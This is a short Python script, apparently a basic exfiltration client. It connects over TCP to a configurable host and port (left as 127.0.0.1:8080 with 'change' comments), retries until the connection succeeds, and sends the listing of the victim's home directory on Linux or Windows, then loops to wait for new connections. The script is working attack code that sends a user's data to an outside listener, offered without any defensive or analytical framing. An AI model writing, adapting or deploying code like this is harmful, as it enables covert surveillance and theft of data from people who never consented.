import socket
import platform
import sys
import os

ADDR = "127.0.0.1"		 # change	
PORT = 8080      		 # change

if sys.platform == "linux" or sys.platform == "linux2":
	DIRPATH = os.path.expanduser( '~' )
elif sys.platform == "win32":
	DIRPATH = os.getenv("USERPROFILE")

def connect():
	print("Connecting....")
	conn = s.connect_ex((ADDR, PORT))
	while conn != 0:
		conn = s.connect_ex((ADDR, PORT))
	print("Connected!")
	return 0

def main():
	if connect() == 0:
		dirlist = os.listdir(DIRPATH)

		for shit in dirlist:
			if s.sendall((shit + "\n").encode()) is not None:
				return
			
		print("Info Extracted Successfully")
		s.close()
		return
	else:
		connect()


if __name__ == '__main__':
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		main()
		print("Waiting for new connection...")
